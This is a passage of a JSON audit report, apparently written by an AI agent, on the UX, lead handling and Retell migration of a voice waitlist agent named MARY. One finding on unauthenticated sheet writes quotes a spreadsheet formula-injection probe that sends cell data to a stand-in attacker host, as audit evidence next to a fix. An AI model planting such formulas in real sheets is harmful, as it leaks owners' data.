+        "recommendation": "Send a confirmation the first time a row reaches signed_up or callback. The simplest place is Apps Script MailApp inside upsertLead, which already detects that transition (Code.gs:218-224). The quota is 100 recipients/day on a consumer account and 1,500 on Workspace (https://developers.google.com/apps-script/guides/services/quotas, updated 2026-09-03). Alternatively send it from the Worker through a transactional email provider. Include the captured details and 'reply to fix anything'. Show 'Check your inbox' on the end screen.",
+        "effort": "M",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "Emails are never validated or read back, and the domain part isn't checked",
+        "severity": "P1",
+        "area": "conversation",
+        "evidence": "The schema is email: z.string().max(200) (src/lib/lead-sync.ts:21), and the local /api/lead accepted 'sam at example' (.../ux-audit/leads/schema-probe.out.json). Grounding accepts the whole value when only the local part appears in anything the visitor said (mary-grounding.ts:301-302: local.length >= 2 && squashed.includes(local)). If the visitor said 'Sam', any 'sam@<made-up domain>' passes. The Retell argument schema is the same arg(200) (src/lib/retell-shared.ts:149). The spec shows a read-back in one example (mary-voice.md:461), but no rule requires it. Retell ships an email-spelling prompt pattern (https://docs.retellai.com/build/prompt-situation-guide).",
+        "user_impact": "A wrong or invented email is shown as 'Details confirmed' and stored, and the lead can't be reached. The only way to fix it is 'Start another conversation', which creates a duplicate row.",
+        "recommendation": "Require a format like x@y.tld and require the domain tokens to appear in what the visitor said (in groundCollected and in the lead schema). A value that fails goes back to MARY as rejected so she asks again. Add a spelled read-back rule for email and phone to the CONTACT phase. Add a 'Fix a detail' action on the end screen that edits the same sessionId row.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "Nobody is told when a lead arrives, callbacks included",
+        "severity": "P1",
+        "area": "owner view",
+        "evidence": "The owner view reads only this browser's localStorage (src/components/waitlist-vault.tsx:57) plus the sheet's row count (lines 61-97). There is no notification code, and Code.gs only writes rows and an Activity log (Code.gs:233). Callback copy promises 'The team receives your request straight away' (text.ts:71). Retell's alerting only watches totals: 'It isn't built for reacting to a single call' (https://docs.retellai.com/features/alerting-overview).",
+        "user_impact": "A visitor who asked to be called back waits on a sheet nobody may open for days. Speed-to-lead is the product's own pitch.",
+        "recommendation": "In Code.gs upsertLead, on the first change to 'Callback requested' or 'On the waitlist', send the owner an email with MailApp, or post to a Slack incoming webhook with UrlFetchApp. Include name, phone/email, business, the summary and a link to the row. Add a daily digest of in-progress or abandoned rows that have contact details.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "Retell path: save_lead and the webhook still need a durability guarantee",
+        "severity": "P1",
+        "area": "lead delivery",
+        "evidence": "Retell webhooks time out after 10 s and are retried up to 3 times, then dropped; Retell's docs say to return 2xx only 'as soon as you have safely accepted the payload' (https://docs.retellai.com/features/webhook-overview). The plan's webhook gives the sheet 7 s and returns 502 on failure (scratchpad/retell/plan.md:536-538). When no sheet is configured it returns 204 and writes nothing. Dedupe is per isolate (plan.md:1131). save_lead writes the sheet only at final or callback (plan.md:526). Retell keeps call history indefinitely by default (https://docs.retellai.com/accounts/data-retention), and its list-calls API accepts filter_criteria (https://docs.retellai.com/api-references/list-calls).",
+        "user_impact": "If the sheet is down for longer than Retell's retry window, or isn't configured, voice leads exist only in Retell's dashboard and nobody notices.",
+        "recommendation": "Make these go-live gates: (1) refuse VOICE_PROVIDER=retell unless /api/lead reports configured and reachable. (2) Upsert keyed by sessionId (falling back to retell_<call_id>) so save_lead, call_ended, call_analyzed and retries all land on one row. (3) Add a reconciliation job (a scheduled task or a retell/reconcile.ts script) that lists the agent's calls since the last run and upserts any that are missing from the sheet. (4) Set Retell data retention to at least 30 days so Retell is the durable backup. (5) Fire the owner alert and the confirmation email from that same upsert. (6) Drive the end screen from the save_lead result.",
+        "effort": "M",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "The next person on a shared device inherits the previous visitor's details and overwrites their row",
+        "severity": "P2",
+        "area": "lead delivery",
+        "evidence": "Mocked run: visitor 1 gave a name and business and walked off. After a reload, visitor 2 ('Hi, I am Jordan') started with the pills already showing 'Sam Rivera · Rivera Homes · Real estate' (.../ux-audit/leads/kiosk-visitor2-call.png). The turn request carried visitor 1's collected fields, and visitor 2's lead POST reused sessionId w_muhtl1aw_0v9hdi with a new 128-character transcript (kiosk.json). Causes: progress is restored for the sessionStorage id (mary-app.tsx:467-474; waitlist-store.ts:98-109), and Code.gs overwrites the Transcript cell (Code.gs:216). The same mechanism means a single visitor who reloads mid-call replaces their earlier transcript in the row.",
+        "user_impact": "On a booth or demo tablet, rows merge: visitor 1's name ends up on visitor 2's conversation. Every earlier visitor's personal data also stays readable in that device's owner view, with no expiry.",
+        "recommendation": "Restore only if the entry was updated in the last ~10 minutes, and ask 'Continue as Sam?' before reusing it. In Code.gs, append transcript parts instead of overwriting. Add ?kiosk=1, which clears local entries after each finish and after an idle timeout.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "Visitors whose browser blocks storage all share one row named 'session'",
+        "severity": "P2",
+        "area": "lead delivery",
+        "evidence": "sessionId() returns the literal 'session' when storage throws (src/lib/waitlist-store.ts:99,107). Two mocked visitors with blocked storage (Ana, Ben) both posted sessionId 'session' (.../ux-audit/leads/blocked-storage.json). Code.gs upserts by session (Code.gs:173), so the last one to write wins.",
+        "user_impact": "Each such visitor overwrites the previous one's details. This happens with Chrome's 'block all cookies' setting and in some embedded or in-app browsers.",
+        "recommendation": "Fall back to an in-memory crypto.randomUUID() per page load instead of a constant.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "The same person gets several rows and several positions",
+        "severity": "P2",
+        "area": "lead delivery",
+        "evidence": "'Start another conversation' calls newSession() (mary-app.tsx:591-595). A mocked repeat sign-up with the same email created sessions w_muhtlv7k_9ipkvx and w_muhtmdwe_i92y27, shown as positions #690 and #250 (.../ux-audit/leads/again.json, again-second-end.png). Code.gs deduplicates by session only (Code.gs:173) and hands out a new position for every row (Code.gs:220-224).",
+        "user_impact": "Counts and positions inflate, the team may contact the same person twice, and the visitor sees a different number each time.",
+        "recommendation": "In Code.gs, normalise the email and, when a signed_up or callback row arrives with an email that already holds a position, reuse that position and record the extra session id. The 'Fix a detail' flow on the end screen replaces 'start over' as the way to correct details.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "Anyone can write rows into the sheet, including formulas",
+        "severity": "P2",
+        "area": "lead delivery",
+        "evidence": "The guard lets requests with no Origin through, by design for beacons (src/lib/api-guard.ts:44-49). /api/lead accepted the name '=HYPERLINK(\"https://evil.example/?\"&C2,\"click\")' (.../ux-audit/leads/schema-probe.out.json). The repo's Code.gs writes cells with setValues and appendRow (Code.gs:227-229), and Apps Script's docs say that for setValues, 'If a value begins with =, it's interpreted as a formula' (https://developers.google.com/apps-script/reference/spreadsheet/range, updated 2026-08-19). SHARED_SECRET defaults to an empty string (Code.gs:27).",
+        "user_impact": "Once the sheet is connected, a script can flood it with fake sign-ups (each one takes a real position). It can also plant formulas that run in the owner's account when they open the sheet and send other rows to an outside server.",
+        "recommendation": "In setIf, prefix any value starting with = + - @ with an apostrophe. Require a non-empty secret. Accept only sessionIds in this site's w_ format and issue a per-session token at Start (decision D4). Rate-limit per session.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "One over-long field makes the server reject the whole lead",
+        "severity": "P2",
+        "area": "errors",
+        "evidence": "The local /api/lead returned 400 for operations of 401 characters, business 201, name 121 and transcript 60,001 (.../ux-audit/leads/schema-probe.out.json; lead-sync.ts:20-27; lead.ts:48-51). Turn input allows 600 characters per field (mary.functions.ts:96), and the model's operations output has no limit (mary-prompt.server.ts:33). Every checkpoint, the final save and the beacon repeat the same field, so they all fail. This is unlikely: the one live sample of operations was 70 characters (ux-audit/conversation logs).",
+        "user_impact": "A talkative visitor's entire lead is silently dropped; the client doesn't log the 400.",
+        "recommendation": "Truncate instead of rejecting in LeadPayloadSchema (.transform(v => v.slice(0, cap)), as src/lib/retell-shared.ts:66 already does), and log a warning on the server.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "There is no funnel data, so you can't see where people drop off",
+        "severity": "P2",
+        "area": "analytics",
+        "evidence": "The only analytics is Lovable's flock.js page_hit (live HTML: <script defer src=\"/~flock.js\" data-proxy-url=\"/~api/analytics\">, saved at .../ux-audit/leads/flock.js). There are no product events in src/ (grep for analytics|gtag|posthog finds nothing). A session with zero answers never creates a row (lead-lifecycle.ts:148 `turns < 1`), checkpoints fire only when a field changes (lead-lifecycle.ts:79-94), and mic denials and transcription failures are never recorded. flock.js already exposes window.Tinybird.trackEvent(action, payload), which masks email and phone keys.",
+        "user_impact": "You can't answer how many people tapped Start, granted the mic, answered once, gave an email or finished. So you can't tell whether audio, the opening or the email ask is losing people.",
+        "recommendation": "Send about 8 events: landing_view, start_voice or start_typed, mic_granted or mic_denied, first_answer, field_captured, email_captured, wrap, outcome. Use window.Tinybird?.trackEvent, or a small /api/event route that writes to Cloudflare Analytics Engine. Also send an in_progress row at Start and add a 'Furthest step' column to the sheet.",
+        "effort": "M",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "The Apps Script that is deployed is not the one in the repo",
+        "severity": "P2",
+        "area": "lead delivery",
+        "evidence": "PROJECT-STATE.md:64: 'Hardened Apps Script (rewritten, not Lovable's) deployed ... ping ok (version 2026-09-23)'. The repo copy, docs/google-sheets/Code.gs, is VERSION '2026-09-22' (line 39) with SHARED_SECRET '' (line 27). docs/audit is excluded from git (PROJECT-STATE.md:63) and not present in this checkout.",
+        "user_impact": "Whoever next follows docs/google-sheets/README.md redeploys the weaker script, and nobody can review the code that actually receives the leads.",
+        "recommendation": "Commit the deployed script, without secrets, to docs/google-sheets/Code.gs. Have GET /api/lead check the ping version against an expected constant.",
+        "effort": "S",
+        "retell": "independent"
+      },
+      {
+        "title": "There is no privacy notice where details are collected, and Retell will add stored recordings",
+        "severity": "P2",
+        "area": "copy/trust",
+        "evidence": "No privacy, terms or consent copy in landing.tsx, site-frame.tsx or call-stage.tsx (grep). Each row stores name, email, phone, full transcript, user agent, referrer and timezone (Code.gs:43-72). The Retell plan ships data_storage_setting 'everything' and lists disclosure as an open question (scratchpad/retell/plan.md:981,1139). Retell keeps data indefinitely unless a retention period is set (https://docs.retellai.com/accounts/data-retention).",
+        "user_impact": "Business visitors ask where their data goes, and MARY's scripted answer (mary-voice.md:388) is about the product, not this conversation. Having no notice at all can block legal sign-off for EU or California visitors.",
+        "recommendation": "Add one line under Start: 'MARY records this conversation to set up your early access. Privacy →', linking a short policy (what is kept, where — Google Sheet and Retell — how long, and who to contact to delete it). Set a Retell retention period (e.g. 90 days).",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "A callback request can't finish without a phone number",
+        "severity": "P3",
+        "area": "conversation",
+        "evidence": "endingFor() requires name and phone before a callback can end (src/features/mary/conversation/text.ts:54), but the spec also puts 'emailed instead' under CALLBACK (docs/mary-voice.md:299).",
+        "user_impact": "A visitor who says 'just email me' and won't give a number keeps getting asked for one and never reaches an end state.",
+        "recommendation": "Let a callback end with name plus email or phone, and show 'We'll email you' on the end screen.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      }
+    ]
+  },
+  "market": {
+    "summary": "I compared MARY's landing, call, typing and end screens (landing.tsx, call-stage.tsx, composer.tsx, end-screen.tsx, mary-app.tsx, text.ts) with what the leading voice agents do as of September 2026. The comparison covers ElevenLabs (changelogs from Aug 24 to Sep 21 2026, plus captures of its consent screen and in-call screen), Vapi and Sesame (captured live on 2026-09-26), Retell (SDK 3.0.1 published 2026-09-08, the 2026-09-30 deprecations, agent settings, pricing, concurrency limits and the Jun–Aug 2026 changelog), OpenAI GPT-Live-1 (2026-09-10) and Hume. MARY already matches or beats the market on several points, so none of the findings below cover them: live word-by-word captions with a 'Show conversation' panel, clear turn cues (orb states and a status line), a 'Type instead' option that is always there, the 'two minutes' expectation on the landing page (the happy-path worked example comes to about 2.2–2.6 minutes), progress pills showing what she has captured, memory of returning visitors, and a screen-reader live region. The gaps are the table-stakes controls every competitor ships: there is no way to end the call and no notice about recording or data use before the mic opens. The first impression is slow: 4.4 s of silence from the tap to her first word, against about 1.7 s for ElevenLabs. The sign-up confirmation is not honest yet: she promises an email that is never sent, and the position number is made up while the Sheet is not connected. For Retell, I recommend building on SDK 3.x now, because 2.x and /v2/create-web-call are deprecated on 2026-09-30. The migration has to deliberately keep three things Retell does not give by default: live captions (in 3.x they need a key with Call.Write), the progress pills with an email readback you can correct, and the typing fallback. Retell's own settings also need MARY-specific values: silence and call-length limits, a 'lines busy' state for the 20-call concurrency default, and filler speech while save_lead runs. I made no live AI calls.",
+    "findings": [
+      {
+        "title": "No way to end the call: every leading voice UI has a one-tap hang-up",
+        "severity": "P1",
+        "area": "conversation",
+        "evidence": "src/features/mary/ui/call-stage.tsx:142-176: the header holds only the talk-mode and voice toggles. The reducer has no end action (src/features/mary/conversation/reducer.ts:35-92): FINISH comes only from lead.finalize, when MARY decides the call is over (text.ts:51-59). Competitors: ElevenLabs /agents puts a hang-up button in the middle of the orb (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/browser/during-agents-ios.png, captured 2026-09-23). Vapi's live demo shows an end-call button next to a timer (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/market/shots/vapi-demo-10s-ios.png, 2026-09-26), and its widget's end-button-text defaults to 'End Call' (https://docs.vapi.ai/chat/web-widget). The Retell SDK 3.0.1 README says 'await call.end(); // leaving is what ends a web call' (npm, 2026-09-08).",
+        "user_impact": "A visitor who is done, got interrupted, or is unhappy can only close the tab. They never see the end screen, never confirm what was saved, and never get the 'no pressure' exit. The call just stops, which feels like a trap for a voice product and adds to abandonment.",
+        "recommendation": "Add an 'End' control to the CallStage header on every breakpoint, as an icon plus label at 44px or larger, next to the voice toggle. When pressed: stop speech, close the mic and call lead.finalize with the current state. If an email is already collected, go to the end screen with 'Want me to save what you told me?'. Otherwise go to the declined screen, which has 'Keep talking' (end-screen.tsx:104-122). With Retell, wire the same button to call.end() and let the call_ended webhook finalize the sheet row.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "No notice about recording, AI processing or privacy before the mic opens",
+        "severity": "P1",
+        "area": "copy/trust",
+        "evidence": "The live landing captured by this lens (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/market/shots/mary-live-landing-ios.png) has 0 links and no text matching privacy/record/consent/terms. landing.tsx:139-165 and site-frame.tsx:30-49 have no notice either. Tapping Start requests the mic at once (mary-app.tsx:517-525). Transcripts go to the sheet and to /api/reflect, which stores 'lessons' (mary-app.tsx:95-119). What competitors do: ElevenLabs requires a notice 'immediately prior to any interaction' covering both AI and recording (https://elevenlabs.io/docs/eleven-agents/legal/disclosure-requirement), and its own demo shows an 'I agree' sheet (18+, AI, recorded, privacy policy) at /tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/browser/terms-agents-ios.png. Sesame links its Terms and Privacy before the call (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/market/shots/sesame-ios.png). Vapi's widget has require-consent. EU AI Act Art. 50 transparency applies from 2026-08-02, and 11 US states require all-party consent to recording (https://justcall.io/blog/ai-voice-agent-disclosure-laws.html, updated 2026-09-22). Retell's data_storage_setting defaults to 'everything', meaning recordings are kept (https://docs.retellai.com/api-references/create-agent).",
+        "user_impact": "Careful B2B visitors, who are the qualified leads MARY wants, get no signal about what happens to their voice and details. Once Retell is live, calls are recorded by default with no notice, which is a legal exposure in all-party-consent states and the EU.",
+        "recommendation": "Put one quiet line under the Start/Type buttons in landing.tsx, for example: 'MARY is an AI. Your conversation is recorded and transcribed to set up your spot. Privacy.' Link a real privacy page from SiteFooter. Keep the AI mention in her opener (retell-shared.ts:38-42 already says 'AI Revenue Concierge'). Do not add a blocking modal, because the inline line keeps the one-tap start. With Retell, set data_storage_setting to 'everything_except_pii' (or add pii_config at +$0.01/min per https://www.retellai.com/pricing) and make sure the wording matches what Retell stores.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "4.4 s of silence after 'Start talking' because the opener is generated by the LLM; ElevenLabs speaks in about 1.7 s",
+        "severity": "P1",
+        "area": "first words",
+        "evidence": "The funnel lens measured the first word revealed 4433 ms after the tap on the live site (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/funnel/log-voice-ios.json). The /api/turn welcome returned its 'say' at 2.98 s (funnel/turn-welcome.ndjson), and the first TTS audio came 1.28 s after the speech request (funnel/speech-welcome.timing). welcome() runs a full LLM turn (src/features/mary/conversation/turn-runner.ts:52-54), even though fixed openers already exist (src/lib/retell-shared.ts:38-42). The opener also runs 22 words before her question. For comparison, ElevenLabs' demo, captured through the same proxy, went from the mic request to its first agent audio in about 1.75 s (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/browser/log-agents-ios.json: getUserMedia t=13947, audio_event t=15693), using a static 12-word greeting that ends in a question.",
+        "user_impact": "The most fragile moment of a voice product is right after the tap. For more than 4 s the visitor sees 'Thinking… hold to talk' and hears nothing, so many will wonder whether it is broken or whether their volume is up. The late start also pushes the first real exchange (her name question) to about 12 s after the tap.",
+        "recommendation": "Do this now: make turn 1 a canned line picked from OPENING_LINES (or a shorter one ending in 'What should I call you?'). Ship its audio as pre-rendered static files (3 MP3s on the CDN, so there is no per-visit TTS cost) and play them from the Start tap. Let /api/turn start working on turn 2 context in parallel. Target: first audible word under 1 s. With Retell, use a static begin message (or the opening_line dynamic variable with begin_message_delay_ms=0) and never an LLM-generated first turn.",
+        "effort": "S",
+        "retell": "solved_by_retell"
+      },
+      {
+        "title": "She promises an 'early-access confirmation' email that is never sent",
+        "severity": "P1",
+        "area": "end screen",
+        "evidence": "The playbook line 'So I know where to send your early-access confirmation — best email?' appears at docs/mary-voice.md:193, 459 and 509, and the prompt at src/lib/mary-prompt.server.ts:125 ties the email to the spot confirmation. end-screen.tsx:100 says 'Your position comes with the confirmation.' A grep for resend/sendgrid/MailApp/GmailApp across src/ and docs/google-sheets/Code.gs finds nothing, so no email is sent anywhere. Best practice: 'Send the email immediately, because an inbox confirmation is what makes it feel real' (https://21st.dev/blog/react-waitlist-page-components, 2026-08-20). Confirmation emails see 75–90% open rates, subject 'You're on the list' (https://getlaunchlist.com/blog/waitlist-email-templates-that-get-opened, updated 2026-04-24). Sesame keeps call summaries in the thread (WinBuzzer, 2026-05-29).",
+        "user_impact": "Every signed-up visitor is told to expect an email that never arrives. That undoes the trust MARY builds in the call, and it removes the only proof of sign-up and the one channel for a follow-up (a referral or an invite).",
+        "recommendation": "Send a short confirmation from the existing Apps Script when a row first becomes signed_up. MailApp works in docs/google-sheets/Code.gs with no new vendor. Include the name, what they joined, the real position and one next step. With Retell, trigger it from the call_analyzed webhook and use Retell's call_summary to add a two-line 'what you told MARY' recap. Until that is live, change the copy: MARY should ask for the email 'so we can reach you when early access opens', not promise a confirmation.",
+        "effort": "S",
+        "retell": "independent"
+      },
+      {
+        "title": "The 'Early access position #N' shown to visitors is a hash of their email while the Sheet is not connected",
+        "severity": "P1",
+        "area": "end screen",
+        "evidence": "positionFor() returns 128 + hash % 640 (src/lib/waitlist-store.ts:122-126). When the sheet is not configured, the end screen shows that number (src/features/mary/conversation/lead-lifecycle.ts:124-125 → end-screen.tsx:91), and CLAUDE.md says SHEETS_WEBAPP_URL is not set. The steps then state 'Invitations go out in order of position' (conversation/text.ts:90). An example is shown in the screenshot /tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/funnel/shots/convo-ios-22-end-full.png ('#327'). Best practice is a real confirmation that 'states what they signed up for and when to expect something' (https://21st.dev/blog/react-waitlist-page-components, 2026-08-20).",
+        "user_impact": "Right now visitors are shown a precise, invented queue number and told invitations follow it, while the lead exists only in their own localStorage. If they come back or compare with a colleague, the number means nothing. A fake-looking number is a trust breaker for a sales product.",
+        "recommendation": "Show a position only when the sheet returns one (sync === 'sheet' and a numeric position). Otherwise use honest copy such as 'You're on the list — we'll email you when early access opens' and drop the 'order of position' step. With Retell, have save_lead return the sheet's real position so MARY can say it out loud (retell-migration.md:52-55 already plans this).",
+        "effort": "S",
+        "retell": "independent"
+      },
+      {
+        "title": "Retell SDK 3.x: live captions are off by default and need a key with Call.Write, so the migration can silently lose MARY's captions and transcript panel",
+        "severity": "P1",
+        "area": "transcript",
+        "evidence": "The retell-client-js-sdk 3.0.1 README (npm, published 2026-09-08, saved at /tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/market/retell-sdk-readme.md) says: '`transcript: true` also streams the transcript... it needs a key with `Call.Write`, which a public key scoped to web calls alone won't have, so it is off by default.' retell-migration.md:56 assumes 'the live transcript from SDK transcript events'. retell-shared.ts:23 already has a transcriptKey field. MARY relies on captions for its word-by-word line (call-stage.tsx:15-29, 237-243), for the 'Show conversation' panel (call-stage.tsx:259-268), for the screen-reader live region (call-stage.tsx:182) and for the fallback 'My voice didn't come through just now. The words are on screen.' (composer.tsx:339-341). The market treats captions as the default: ElevenLabs switched widget transcript_enabled and mic_muting_enabled to true by default on 2026-08-24 (https://elevenlabs.io/docs/changelog/2026/8/24), Vapi's show-transcript defaults to true, and ChatGPT voice shows a live transcript in the chat (MacRumors, 2025-11-26).",
+        "user_impact": "If the Retell build ships with a web-call-only public key, the screen shows an orb and nothing to read. Deaf and hard-of-hearing visitors, people in loud rooms and iPhone users whose audio fails all lose the thing that currently saves those calls.",
+        "recommendation": "Make captions an explicit acceptance criterion in build slice 1. Choose one way to get them: (a) a second, narrowly scoped key for the transcript stream (the planned transcriptKey), checked against Retell's key scopes; or (b) relaying transcript updates from the server through /api/retell/call-status. Do not put a broad Call.Write key in the page. Keep word-by-word reveal only where Retell gives timing; otherwise reveal a whole utterance on agent_stop_talking.",
+        "effort": "M",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "Build the Retell path on SDK 3.x now: 2.x and /v2/create-web-call are deprecated on 2026-09-30, and 3.0.1 answers the design doc's open questions",
+        "severity": "P2",
+        "area": "conversation",
+        "evidence": "Deprecation notice: 'Browser JS SDK v2 … Upgrade to SDK 3.x, replace RetellWebClient with RetellClient … Also deprecates POST /v2/create-web-call' on 09/30/2026 (https://docs.retellai.com/deprecation-notice/overview). The 3.0.1 README (2026-09-08) lists onAgentStartTalking/onAgentStopTalking (for the orb), an 'audio' event with emitRawAudioSamples (for the level), mute()/unmute(), end(), startAudioPlayback() to be called from a click (https://docs.retellai.com/deploy/web-call), and optional reCAPTCHA v3 on the public key. retell-migration.md:113-117 still lists these as VERIFY, and its flow (lines 38-42) mints tokens on the server, whereas 3.x RetellClient is public-key plus domain-allowlist and skips src/lib/api-guard.ts.",
+        "user_impact": "Building on RetellWebClient or startCall would ship on a deprecated path that is removed in 4.0, forcing a second migration. Choosing the public-key flow without reCAPTCHA leaves the paid voice minutes open to scripted abuse.",
+        "recommendation": "Update retell-migration.md to target RetellClient.createWebCall. Drive the orb from onAgentStart/StopTalking plus the audio level. Map startAudioPlayback() onto the existing iPhone 'Can't hear her? Play sound' button (composer.tsx:320-338). Either enable reCAPTCHA v3 on the public key or keep server-side creation through /api/retell/web-call behind api-guard, and document which one is used.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "Hold-to-talk is the default, while the market standard is an open mic you can interrupt",
+        "severity": "P2",
+        "area": "turn-taking",
+        "evidence": "The initial talkMode is 'hold' (src/features/mary/conversation/reducer.ts:17). The hold button is a full-width 64px bar (composer.tsx:83) that takes over the phone screen (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/funnel/shots/convo-ios-15-progress-pills.png). ElevenLabs, Vapi and Sesame demos all run an open mic (captures listed above). GPT-Live-1 (GA 2026-09-10) is full-duplex with 'almost 80% fewer interruptions' (https://www.testingcatalog.com/openai-launches-gpt-live-1-for-full-duplex-voice-agents/). Retell exposes interruption_sensitivity, responsiveness, enable_dynamic_responsiveness, and denoising_mode 'noise-and-background-speech-cancellation' (https://docs.retellai.com/api-references/create-agent) at +$0.005/min (https://www.retellai.com/pricing).",
+        "user_impact": "Hold-to-talk makes the experience feel like a walkie-talkie rather than a phone call. Visitors have to learn a gesture, keep a finger on the screen and remember to let go, and 'Didn't catch that' notices follow a missed hold. That weakens the 'talk to her like a person' promise on the landing page.",
+        "recommendation": "Under Retell, default to an open mic, with denoising_mode set to noise-and-background-speech-cancellation and interruption_sensitivity tuned below 1 for speakerphone use. Replace the hold bar with a visible mute toggle (ElevenLabs turned muting on by default on 2026-08-24) and keep 'Type instead'. Keep hold-to-talk only as a manual 'noisy room' option if testing shows it is still needed.",
+        "effort": "M",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "Retell's default silence and length limits are wrong for a two-minute waitlist call and cost money on abandoned tabs",
+        "severity": "P2",
+        "area": "conversation",
+        "evidence": "Retell defaults: reminder_trigger_ms 10000, reminder_max_count 1, end_call_after_silence_ms 600000 (10 min), max_call_duration_ms 3600000 (https://docs.retellai.com/api-references/create-agent). A plausible MARY setup costs voice infra $0.055 + TTS $0.015 + GPT 5.6 Terra $0.064 + denoise $0.005 ≈ $0.139/min (https://www.retellai.com/pricing), so an abandoned tab left on the default silence limit burns about $1.39, versus about $0.35 for a real 2.5-minute sign-up. Today MARY's nudges (mary-app.tsx:378-398, 22 s, 3 lines in text.ts:137-141) fire only when the mic is muted or missing.",
+        "user_impact": "People who walk away leave a live, billed line open for up to 10 minutes. People who go quiet get a single generic reminder instead of MARY's own nudges, and the call never closes cleanly into the end screen.",
+        "recommendation": "In the Retell agent set reminder_trigger_ms to about 8000, reminder_max_count to 2 (prompting the LLM with the IDLE_NUDGES wording), end_call_after_silence_ms to about 60000, and max_call_duration_ms to about 480000. On the client, an onEnd with a silence disconnection_reason should land on the end screen with the partial save, not an error.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "No 'all lines busy' state: Retell allows 20 concurrent calls by default and a launch spike will exceed that",
+        "severity": "P2",
+        "area": "errors",
+        "evidence": "'Pay-As-You-Go workspaces are allocated a quota of 20 concurrent calls by default … All active voice calls draw from the same concurrency pool'. Burst is capped at 3× and adds $0.10/min for the whole call (https://docs.retellai.com/deploy/concurrency). ElevenLabs' widget added 'concurrency queue status' on 2026-08-24 (https://elevenlabs.io/docs/changelog/2026/8/24). MARY's start() (mary-app.tsx:508-536) has no busy or capacity branch.",
+        "user_impact": "On launch day (Product Hunt, a newsletter) visitors 21 and up would get a failed call at the exact moment demand peaks. Those leads are most likely lost.",
+        "recommendation": "When web-call creation fails with a concurrency error, show a warm 'MARY is on a lot of calls right now' state. Offer to switch to typing (which still uses /api/turn) and, once built, 'Call me instead'. Keep the collected fields. Turn on burst for launch days, and budget extra concurrency based on the expected peak.",
+        "effort": "M",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "Silence while save_lead runs: use Retell's speak-during-execution and filler speech",
+        "severity": "P2",
+        "area": "latency masking",
+        "evidence": "Today the end screen shows 'Securing your place…' while the sheet call runs (end-screen.tsx:81), and during a call only '…' appears while she is thinking (call-stage.tsx:255). Retell custom functions support 'Speak During Execution' (e.g. 'Let me retrieve that information for you') (https://docs.retellai.com/build/single-multi-prompt/custom-function). By default a function 'isn't retried — if the request fails or times out, the agent receives the error message' (https://docs.retellai.com/build/conversation-flow/custom-function). ElevenLabs recommends 3.0 s soft-timeout fillers (https://elevenlabs.io/docs/eleven-agents/customization/conversation-flow), and GPT-Live-1 'can keep a conversation moving while … actions run' (2026-09-10).",
+        "user_impact": "The Apps Script write plus position lookup can take seconds. Without a filler, MARY goes quiet at the very moment the visitor is being signed up, which reads as a dropped call.",
+        "recommendation": "Turn on speak_during_execution for save_lead with a MARY-voiced line ('One sec — locking in your spot'). Set a function timeout of 8–10 s. Write the prompt so that on a timeout she confirms the details are saved and says the position will come by email, rather than reading out an error. Consider enable_backchannel with a low frequency for long answers.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "Keep MARY's differentiator in Retell: live progress pills and an email readback the visitor can correct",
+        "severity": "P2",
+        "area": "conversation",
+        "evidence": "The pills show captured values, including the email, during the call (progress-pills.tsx; /tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/funnel/shots/convo-ios-15-progress-pills.png). No competitor widget does this (ElevenLabs, Vapi and Retell widgets show only an orb or waveform and a transcript). Retell supplies no such UI, and the contract already plans note_details plus /api/retell/call-status returning CallProgress.collected (src/lib/retell-shared.ts:28, 102-117). Spoken emails are a known failure mode: OpenAI markets 'alphanumeric recognition' as a distinct GPT-Live-1 capability (2026-09-10), and GPT Transcribe adds keyword hints (https://developers.openai.com/api/docs/changelog, 2026-07-28). The pill text is truncated at max-w-32 (progress-pills.tsx:333).",
